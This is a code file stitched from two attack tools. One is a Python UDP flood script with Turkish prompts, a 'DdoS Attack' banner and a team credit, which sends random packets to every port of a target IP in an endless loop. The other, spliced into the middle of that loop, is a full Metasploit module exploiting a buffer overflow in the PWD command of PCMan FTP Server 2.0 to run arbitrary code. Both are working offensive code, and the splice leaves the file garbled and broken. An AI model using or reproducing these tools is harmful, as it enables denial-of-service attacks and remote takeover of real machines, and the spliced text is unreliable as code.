import os
import socket
import random
import time
from colorama import Fore
from datetime import datetime

now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year


white = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

os.system("clear")

print(Fore.RED + """
      ┌─────────────────────────────────────────────────┐
      │         _          ____      _                  │
      │        | |        |  _ \  __| | ___  ___        │
      │        | |   _____| | | |/ _` |/ _ \/ __|       │
      │        | |__|_____| |_| | (_| | (_) \__ \       │
      │        |_____|    |____/ \__,_|\___/|___/       │
      │                                                 │
      └─────────────────────────────────────────────────┘
""")

ip = input("IP Gir : ")
port = input("Porta girin: ")
os.system("figlet DdoS Attack")
print("Team : LİZARD SQUARD")
print("\033[92m")
print("[                    ] 0% ")
time.sleep(5)
print("[=====               ] 25%")
time.sleep(5)
print("[==========          ] 50%")
time.sleep(5)
print("[===============     ] 75%")
time.sleep(5)
print("[====================] 100%")
time.sleep(3)
sent = 0


while True:
    sent = 0
    for port in range(1, 65534):
        white.sendto(bytes, (ip, port))
        sent = sent + 1












##
# This module required Metasploit: https://metasploit.com/download
# Current Source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'PCMan FTP Server 2.0 Remote Buffer Overflow',
        'Description' => %q{
           PCMan FTP Server 2.0 contains a buffer overflow vulnerability in the 'pwd'
           command that allows remote attackers to execute arbitrary code.
           Attackers can send a specially crafted payload during the FTP login
           process to overwrite memory and potentially gain system access.
        },
        'Author' => ['CyberWarrior1'],
        'License' => MSF_LICENSE,
        'DisclosureDate' => '2024-02-02',
        'References' => [
           ['CVE', '2024-58299'],
           ['EDB', '51767'],
           ['URL', 'https://www.vulncheck.com/advisories/pcman-ftp-server-remote-buffer-overflow-via-pwd-command'],
           ['CVSS', '9.3']
        ],
        'Platform' => ['win'],
        'Payload' => {
           'Space' => 1024,
           'BadChars' => "\x00\x0a\x0d"
        },
        'Targets' => [
          [
            'Windows XP SP3 English',
            {
              'Ret' => 0x77c35459, # push esp ret C:\WINDOWS\system32\msvcrt.dll
              'Offset' => 2007 # Windows XP SP3 Pack * 2007
            }
          ]
        ],
        'DefaultTarget' => 0,
      )
    )
  end

  def exploit
    connect

    banner_res = sock.get_once
    print_status("Banner: #{banner_res.strip}")

    print_status("Logging in ...")
    sock.put("USER anonymous\r\n")
    sock.get_once
    sock.put("PASS anonymous\r\n")
    sock.get_once

    print_status('Generating payload...')
    sploit = rand_text_alpha(target['Offset'])
    sploit << [target.ret].pack('V')
    sploit << make_nops(18)
    sploit << payload.encoded

    sock.put("PWD #{sploit}\r\n")
    sock.get_once

    disconnect
  end
end
        print("\033[1;91mPaket \033[1;32m%s \033[1;91mGönderiliyor \033[1;32m%s \033[1;91mPort Sayısı \033[1;32m%s " % (sent, ip, port,))
